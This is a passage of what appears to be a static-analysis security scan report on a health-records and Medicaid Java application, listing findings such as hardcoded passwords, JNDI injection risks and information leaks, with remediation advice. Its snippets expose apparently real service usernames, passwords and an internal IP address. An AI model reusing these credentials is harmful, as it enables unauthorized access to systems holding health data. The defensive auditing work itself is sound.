                        <Issue iid="97FBC9D5982529B913D92BA7EA325735" ruleID="29C589A2-3796-4486-A12D-BCE05ADFFE11">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Storing a plain text password in a configuration file may result in a system compromise.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ESAPI.properties</FileName>
<FilePath>build/properties/ESAPI.properties</FilePath>
<LineStart>87</LineStart>
<Snippet>#
Authenticator.AllowedLoginAttempts=3
Authenticator.MaxOldPasswordHashes=13
Authenticator.UsernameParameterName=username
Authenticator.PasswordParameterName=password</Snippet>
<TargetFunction>Authenticator.MaxOldPasswordHashes()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="6A8E767088550AB2899129FB43AEB425" ruleID="29C589A2-3796-4486-A12D-BCE05ADFFE11">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Storing a plain text password in a configuration file may result in a system compromise.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>ESAPI.properties</FileName>
<FilePath>build/properties/ESAPI.properties</FilePath>
<LineStart>89</LineStart>
<Snippet>Authenticator.MaxOldPasswordHashes=13
Authenticator.UsernameParameterName=username
Authenticator.PasswordParameterName=password
# RememberTokenDuration (in days)
Authenticator.RememberTokenDuration=14</Snippet>
<TargetFunction>Authenticator.PasswordParameterName()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="053C24BE8322196E74BEC9AD6FBBD106" ruleID="29C589A2-3796-4486-A12D-BCE05ADFFE11">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Storing a plain text password in a configuration file may result in a system compromise.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>jboss.application.properties</FileName>
<FilePath>build/properties/jboss.application.properties</FilePath>
<LineStart>107</LineStart>
<Snippet>EHRFilenetWebservicePort=9080
EHRAddDocumentUser=TesterJ2011
EHRAddDocumentUserPassword=December2011
EHRFilenetObjectStore=CHAMPS_DMS_TESTING
EHRFilenetObjectFolder=/eDmsDocuments</Snippet>
<TargetFunction>EHRAddDocumentUserPassword()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="50EFB77E91E8FF55393CEF817E975E76" ruleID="29C589A2-3796-4486-A12D-BCE05ADFFE11">
                            <Category>Password Management: Password in Configuration File</Category>
                            <Folder>High</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>Storing a plain text password in a configuration file may result in a system compromise.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>jboss.application.properties</FileName>
<FilePath>build/properties/jboss.application.properties</FilePath>
<LineStart>56</LineStart>
<Snippet>ONC_WEBSERVICE_HOST_URL=https://na19.salesforce.com/services/Soap/class/CHPLVerificationWebService
ENTERPRISE_WEBSERVICE_HOST_USERID=chplcms@hhs.gov.chpl
ENTERPRISE_WEBSERVICE_HOST_PASSWORD=w0rd!CMSst4t35Ly8QmhhAh6xbLpvNYHmMlzd7H
MD_WEBSERVICE_HOST_URL=https://208.91.160.67:443/emedicaid/EmdAuthenticationService
EHR_DATA_SOURCE=java:ehrTxDataSource</Snippet>
<TargetFunction>ENTERPRISE_WEBSERVICE_HOST_PASSWORD()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="18">
                        <groupTitle>Code Correctness: Constructor Invokes Overridable Function</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>A constructor of AppAreaDetCacheMgr in AppAreaDetCacheMgr.java at line 66 calls a function that can be overridden by an attacker.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>When a constructor calls an overridable function, it may allow an attacker to access the this reference prior to the object being fully initialized, which can in turn lead to a vulnerability.

Example 1: The following calls a method that can be overridden.


  ...
  class User {
    private String username;
    private boolean valid;
    public User(String username, String password){
      this.username = username;
      this.valid = validateUser(username, password);
    }
    public boolean validateUser(String username, String password){
      //validate user is real and can authenticate
      ...
    }
    public final boolean isValid(){
      return valid;
    }
  }


Since the function validateUser and the class are not final, it means that they can be overridden, and then initializing a variable to the subclass that overrides this function would allow bypassing of the validateUser functionality. For example:


  ...
  class Attacker extends User{
    public Attacker(String username, String password){
      super(username, password);
    }
    public boolean validateUser(String username, String password){
      return true;
    }
  }
  ...
  class MainClass{
    public static void main(String[] args){
      User hacker = new Attacker("Evil", "Hacker");
      if (hacker.isValid()){
        System.out.println("Attack successful!");
      }else{
        System.out.println("Attack failed");
      }
    }
  }


The code in Example 1 prints "Attack successful!", since the Attacker class overrides the validateUser() function that is called from the constructor of the superclass User, and Java will first look in the subclass for functions called from the constructor.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Constructors should not call functions that can be overridden, either by specifying them as final, or specifying the class as final. Alternatively if this code is only ever needed in the constructor, the private access specifier can be used, or the logic could be placed directly into the constructor of the superclass.

Example 2: The following makes the class final to prevent the function from being overridden elsewhere.


  ...
  final class User {
    private String username;
    private boolean valid;
    public User(String username, String password){
      this.username = username;
      this.valid = validateUser(username, password);
    }
    private boolean validateUser(String username, String password){
      //validate user is real and can authenticate
      ...
    }
    public final boolean isValid(){
      return valid;
    }
  }


This example specifies the class as final, so that it cannot be subclassed, and changes the validateUser() function to private, since it is not needed elsewhere in this application. This is programming defensively, since at a later date it may be decided that the User class needs to be subclassed, which would result in this vulnerability reappearing if the validateUser() function was not set to private.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>18</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="79857753375818BB96C524E88CE1675B" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>A constructor of UserDetailsBean in UserDetailsBean.java at line 113 calls a function that can be overridden by an attacker.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UserDetailsBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/UserDetailsBean.java</FilePath>
<LineStart>113</LineStart>
<Snippet>        setUserAcctID(p_sUserAcctID);
        setDomainName (p_sDomainName);
        setDomainID (p_sDomainID);
        setSuperUser(p_bIsSuperUser);
 }</Snippet>
<TargetFunction>FunctionCall: setDomainID()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3673AD505CE1EBB55CE0E1F0F177F877" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>A constructor of UserDetailsBean in UserDetailsBean.java at line 112 calls a function that can be overridden by an attacker.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UserDetailsBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/UserDetailsBean.java</FilePath>
<LineStart>112</LineStart>
<Snippet>        setUserID(p_sUserID);
        setUserAcctID(p_sUserAcctID);
        setDomainName (p_sDomainName);
        setDomainID (p_sDomainID);
        setSuperUser(p_bIsSuperUser);</Snippet>
<TargetFunction>FunctionCall: setDomainName()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="26518698CFB052F8251DBBB1ECC7A2E2" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>A constructor of AppAreaDetCacheMgr in AppAreaDetCacheMgr.java at line 66 calls a function that can be overridden by an attacker.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AppAreaDetCacheMgr.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/cache/AppAreaDetCacheMgr.java</FilePath>
<LineStart>66</LineStart>
<Snippet>        m_mapExternalLinkDet = new CNSIMap();
        m_alDisplayTabMenuItem=new CNSIList();
        processRequest(null);
    }
</Snippet>
<TargetFunction>FunctionCall: processRequest()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="13212A224AC739FD81FB3BB95E1E6806" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>A constructor of UserDetailsBean in UserDetailsBean.java at line 110 calls a function that can be overridden by an attacker.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UserDetailsBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/UserDetailsBean.java</FilePath>
<LineStart>110</LineStart>
<Snippet>                       boolean p_bIsSuperUser)
 {
        setUserID(p_sUserID);
        setUserAcctID(p_sUserAcctID);
        setDomainName (p_sDomainName);</Snippet>
<TargetFunction>FunctionCall: setUserID()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8C78755D2155AD1E8F1C473739EC01C0" ruleID="95ACE7A2-BF14-4254-AFD3-22769C5FDC5F">
                            <Category>Code Correctness: Constructor Invokes Overridable Function</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>A constructor of UserDetailsBean in UserDetailsBean.java at line 111 calls a function that can be overridden by an attacker.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UserDetailsBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/UserDetailsBean.java</FilePath>
<LineStart>111</LineStart>
<Snippet> {
        setUserID(p_sUserID);
        setUserAcctID(p_sUserAcctID);
        setDomainName (p_sDomainName);
        setDomainID (p_sDomainID);</Snippet>
<TargetFunction>FunctionCall: setUserAcctID()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="18">
                        <groupTitle>Dynamic Code Evaluation: JNDI Reference Injection</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The program runs a JNDI lookup with an untrusted address in LDAPDomainDAOImpl.java at line 56 that might enable an attacker to run arbitrary Java code remotely.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>If an attacker can control the address of a JNDI lookup operation, he may be able to run arbitrary code remotely by pointing the address to a server he controls and returning a JNDI naming reference to an RMI stored object with a custom object factory.



Example 1: The following code runs a JNDI lookup with untrusted data.


...
String address = request.getParameter("address");

Properties props = new Properties();
props.put(Provider_URL, "rmi://secure-server:1099/");
InitialContext ctx = new InitialContext(props);
ctx.lookup(address);
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Unvalidated user input should not be allowed to control the address of a JNDI lookup. Instead, use a level of indirection: create a list of legitimate addresses that users are allowed to specify and only allow users to select from the list. With this approach, input provided by users is never used directly to specify an address for lookups.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>18</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="5A19B78DC688DFFE6847848F7C1EBE06" ruleID="EEBCD35B-4C0A-4E5C-8D39-9B20F70E8F54">
                            <Category>Dynamic Code Evaluation: JNDI Reference Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The program runs a JNDI lookup with an untrusted address in LDAPDomainDAOImpl.java at line 174 that might enable an attacker to run arbitrary Java code remotely.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>174</LineStart>
<Snippet>		  DistinguishedName dn = new DistinguishedName("cn=DOMAIN_X_USER");	      
	      dn.add("cn",domain.getDomainname()+"_"+userloginid);
	      DirContextAdapter context = (DirContextAdapter)ldapTemplate.lookup(dn);
	      
	      String status = context.getStringAttribute("organizationalStatus");</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.lookup()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>106</LineStart>
<Snippet>	public List getDomainByDomainSid(String domainsid){
		EqualsFilter filter = new EqualsFilter("uniqueIdentifier", domainsid);
		return ldapTemplate.search(new DistinguishedName("cn=DOMAINS"), filter.encode(), getContextMapper());
	}
	</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="59AC8768790FC50490A12DF4432433C7" ruleID="EEBCD35B-4C0A-4E5C-8D39-9B20F70E8F54">
                            <Category>Dynamic Code Evaluation: JNDI Reference Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The program runs a JNDI lookup with an untrusted address in LDAPDomainDAOImpl.java at line 159 that might enable an attacker to run arbitrary Java code remotely.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>159</LineStart>
<Snippet>		  DistinguishedName dn = new DistinguishedName("cn=DOMAIN_X_PROFILE");	      
	      dn.add("cn",domain.getDomainname()+"_"+profilename);	      	      	      
	      DirContextAdapter context = (DirContextAdapter)ldapTemplate.lookup(dn);
	      
	      String status = context.getStringAttribute("organizationalStatus");</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.lookup()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>106</LineStart>
<Snippet>	public List getDomainByDomainSid(String domainsid){
		EqualsFilter filter = new EqualsFilter("uniqueIdentifier", domainsid);
		return ldapTemplate.search(new DistinguishedName("cn=DOMAINS"), filter.encode(), getContextMapper());
	}
	</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="442F3BE13920D9EC8751B683B870209D" ruleID="EEBCD35B-4C0A-4E5C-8D39-9B20F70E8F54">
                            <Category>Dynamic Code Evaluation: JNDI Reference Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The program runs a JNDI lookup with an untrusted address in LDAPDomainDAOImpl.java at line 174 that might enable an attacker to run arbitrary Java code remotely.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>174</LineStart>
<Snippet>		  DistinguishedName dn = new DistinguishedName("cn=DOMAIN_X_USER");	      
	      dn.add("cn",domain.getDomainname()+"_"+userloginid);
	      DirContextAdapter context = (DirContextAdapter)ldapTemplate.lookup(dn);
	      
	      String status = context.getStringAttribute("organizationalStatus");</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.lookup()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPUserDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPUserDAOImpl.java</FilePath>
<LineStart>104</LineStart>
<Snippet>	public List getUserByAccountSid(String accountsid){
		EqualsFilter filter = new EqualsFilter("uniqueIdentifier", accountsid);
		return ldapTemplate.search(new DistinguishedName("cn=USERS"), filter.encode(), getContextMapper());
	}
	public List getDomainsAssociatedToUser(String domainname){</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="518AB3ACA54B34112859E08522C36266" ruleID="EEBCD35B-4C0A-4E5C-8D39-9B20F70E8F54">
                            <Category>Dynamic Code Evaluation: JNDI Reference Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The program runs a JNDI lookup with an untrusted address in LDAPDomainDAOImpl.java at line 56 that might enable an attacker to run arbitrary Java code remotely.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>56</LineStart>
<Snippet>	public void update(Domain domain) {
	      Name dn = buildDn(domain);
	      DirContextAdapter context = (DirContextAdapter)ldapTemplate.lookup(dn);
	      mapToContext(domain, context);
	      ldapTemplate.modifyAttributes(dn, context.getModificationItems());</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.lookup()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>106</LineStart>
<Snippet>	public List getDomainByDomainSid(String domainsid){
		EqualsFilter filter = new EqualsFilter("uniqueIdentifier", domainsid);
		return ldapTemplate.search(new DistinguishedName("cn=DOMAINS"), filter.encode(), getContextMapper());
	}
	</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="0270164B3C2AD83DD7F5DC732BD64892" ruleID="EEBCD35B-4C0A-4E5C-8D39-9B20F70E8F54">
                            <Category>Dynamic Code Evaluation: JNDI Reference Injection</Category>
                            <Folder>High</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>The program runs a JNDI lookup with an untrusted address in LDAPDomainDAOImpl.java at line 159 that might enable an attacker to run arbitrary Java code remotely.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>LDAPDomainDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPDomainDAOImpl.java</FilePath>
<LineStart>159</LineStart>
<Snippet>		  DistinguishedName dn = new DistinguishedName("cn=DOMAIN_X_PROFILE");	      
	      dn.add("cn",domain.getDomainname()+"_"+profilename);	      	      	      
	      DirContextAdapter context = (DirContextAdapter)ldapTemplate.lookup(dn);
	      
	      String status = context.getStringAttribute("organizationalStatus");</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.lookup()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>LDAPProfileDAOImpl.java</FileName>
<FilePath>EHR-ADMIN-JAR/src/com/ehr/service/impl/ldap/LDAPProfileDAOImpl.java</FilePath>
<LineStart>135</LineStart>
<Snippet>	public List getProfileByProfileSid(String profilesid){
		EqualsFilter filter = new EqualsFilter("uniqueIdentifier", profilesid);
		return ldapTemplate.search(new DistinguishedName("cn=PROFILES"), filter.encode(), getContextMapper());
	}
	</Snippet>
<TargetFunction>org.springframework.ldap.core.LdapTemplate.search()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="18">
                        <groupTitle>Poor Error Handling: Throw Inside Finally</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Using a throw statement inside a finally block breaks the logical progression through the try-catch-finally.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>In Java, finally blocks are always executed after their corresponding try-catch blocks and are often used to free allocated resources, such as file handles or database cursors. Throwing an exception in a finally block can bypass critical cleanup code since normal program execution will be disrupted.

Example 1: In the following code, the call to stmt.close() is bypassed when the FileNotFoundException is thrown.

public void processTransaction(Connection conn) throws FileNotFoundException
{
    FileInputStream fis = null;
    Statement stmt = null;
    try
    {
        stmt = conn.createStatement();
        fis = new FileInputStream("badFile.txt");
        ...
    }
    catch (FileNotFoundException fe)
    {
        log("File not found.");
    }
    catch (SQLException se)
    {
        //handle error
    }
    finally
    {
        if (fis == null)
        {
            throw new FileNotFoundException();
        }

        if (stmt != null)
        {
            try
            {
                stmt.close();
            }
            catch (SQLException e)
            {
                log(e);
            }
        }
    }
}

This category is from the Cigital Java Rulepack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Never throw exceptions from within finally blocks. If you must re-throw an exception, do it inside a catch block so as not to interrupt the normal execution of the finally block.
Example 2: The following code re-throws the FileNotFoundException in the catch block.

public void processTransaction(Connection conn) throws FileNotFoundException
{
    FileInputStream fis = null;
    Statement stmt = null;
    try
    {
        stmt = conn.createStatement();
        fis = new FileInputStream("badFile.txt");
        ...
    }
    catch (FileNotFoundException fe)
    {
        log("File not found.");
        throw fe;
    }
    catch (SQLException se)
    {
        //handle error
    }
    finally
    {
        if (fis != null)
        {
            try
            {
                fis.close();
            }
            catch (IOException ie)
            {
                log(ie);
            }
        }

        if (stmt != null)
        {
            try
            {
                stmt.close();
            }
            catch (SQLException e)
            {
                log(e);
            }
        }
    }
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>18</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="63BDFF6C2CAF681DD859E207913725A4" ruleID="1F50410E-C148-415D-94A1-38D911C45919">
                            <Category>Poor Error Handling: Throw Inside Finally</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Using a throw statement inside a finally block breaks the logical progression through the try-catch-finally.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CNSIEditorBean.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/CNSIEditorBean.java</FilePath>
<LineStart>511</LineStart>
<Snippet>		}catch(Exception e){
			e.printStackTrace();
		}finally{
			// Close the input stream
						br.close();</Snippet>
<TargetFunction>FinallyBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="82327C89591DA9C9559A76DACC230348" ruleID="1F50410E-C148-415D-94A1-38D911C45919">
                            <Category>Poor Error Handling: Throw Inside Finally</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Using a throw statement inside a finally block breaks the logical progression through the try-catch-finally.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>178</LineStart>
<Snippet>        }
        finally
        {
            //Close the file input stream and return file content.
            if (l_objBufStream != null)</Snippet>
<TargetFunction>FinallyBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F148956DAD7A6DEC8B28D4422B51AA39" ruleID="1F50410E-C148-415D-94A1-38D911C45919">
                            <Category>Poor Error Handling: Throw Inside Finally</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Using a throw statement inside a finally block breaks the logical progression through the try-catch-finally.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>131</LineStart>
<Snippet>        }
        finally
        {
            //Close the file input stream and return file content.
            if (l_objBufReader != null)</Snippet>
<TargetFunction>FinallyBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BD60652C5DA40365DFB88044530158D8" ruleID="1F50410E-C148-415D-94A1-38D911C45919">
                            <Category>Poor Error Handling: Throw Inside Finally</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Using a throw statement inside a finally block breaks the logical progression through the try-catch-finally.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>557</LineStart>
<Snippet>        }
        finally
        {
            if (bf != null)
        bf.close();</Snippet>
<TargetFunction>FinallyBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="66DE60EB9566E2358B32BE39ED5A9FB0" ruleID="1F50410E-C148-415D-94A1-38D911C45919">
                            <Category>Poor Error Handling: Throw Inside Finally</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Using a throw statement inside a finally block breaks the logical progression through the try-catch-finally.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FileUtil.java</FileName>
<FilePath>CNSI-JAR/src/com/cnsi/common/file/FileUtil.java</FilePath>
<LineStart>214</LineStart>
<Snippet>		}
		finally
		{
			//Close the file input stream and return file content.
			if (l_objBufStream != null)</Snippet>
<TargetFunction>FinallyBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="17">
                        <groupTitle>System Information Leak: External</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>The function sendEmail() in SendEmail.java reveals system data or debug information by calling setSubject() on line 51. The information revealed by setSubject() could help an adversary form a plan of attack.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>An external information leak occurs when system data or debug information leaves the program to a remote machine via a socket or network connection. External leaks can help an attacker by revealing specific data about operating systems, full pathnames, the existence of usernames, or locations of configuration files, and are more serious than internal information leaks, which are more difficult for an attacker to access.



Example 1: The following code leaks Exception information in the HTTP response:


protected void doPost (HttpServletRequest req, HttpServletResponse res) throws IOException {
    ...
    PrintWriter out = res.getWriter();
    try {
        ...
    } catch (Exception e) {
      out.println(e.getMessage());
    }
}


This information can be exposed to a remote user. In some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.

Information leaks are also a concern in a mobile computing environment. With mobile platforms, applications are downloaded from various sources and are run alongside each other on the same device. The likelihood of running a piece of malware next to a banking application is high, which is why application authors need to be careful about what information they include in messages addressed to other applications running on the device.

Example 2: The following code broadcasts the stack trace of a caught exception to all the registered Android receivers.

...
try {
  ...
} catch (Exception e) {
    String exception = Log.getStackTraceString(e);
    Intent i = new Intent();
    i.setAction("SEND_EXCEPTION");
    i.putExtra("exception", exception);
    view.getContext().sendBroadcast(i);
}
...


This is another scenario specific to the mobile environment. Most mobile devices now implement a Near-Field Communication (NFC) protocol for quickly sharing information between devices using radio communication. It works by bringing devices in close proximity or having the devices touch each other. Even though the communication range of NFC is limited to just a few centimeters, eavesdropping, data modification and various other types of attacks are possible, because NFC alone does not ensure secure communication.

Example 3: The Android platform provides support for NFC. The following code creates a message that gets pushed to the other device within range.

...
public static final String TAG = "NfcActivity";
private static final String DATA_SPLITTER = "__:DATA:__";
private static final String MIME_TYPE = "application/my.applications.mimetype";
...
TelephonyManager tm = (TelephonyManager)Context.getSystemService(Context.TELEPHONY_SERVICE);
String VERSION = tm.getDeviceSoftwareVersion();
...
NfcAdapter nfcAdapter = NfcAdapter.getDefaultAdapter(this);
if (nfcAdapter == null)
  return;

String text = TAG + DATA_SPLITTER + VERSION;
NdefRecord record = new NdefRecord(NdefRecord.TNF_MIME_MEDIA,
            MIME_TYPE.getBytes(), new byte[0], text.getBytes());
NdefRecord[] records = { record };
NdefMessage msg = new NdefMessage(records);
nfcAdapter.setNdefPushMessage(msg, this);
...


An NFC Data Exchange Format (NDEF) message contains typed data, a URI, or a custom application payload. If the message contains information about the application, such as its name, MIME type, or device software version, this information could be leaked to an eavesdropper.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>Write error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).

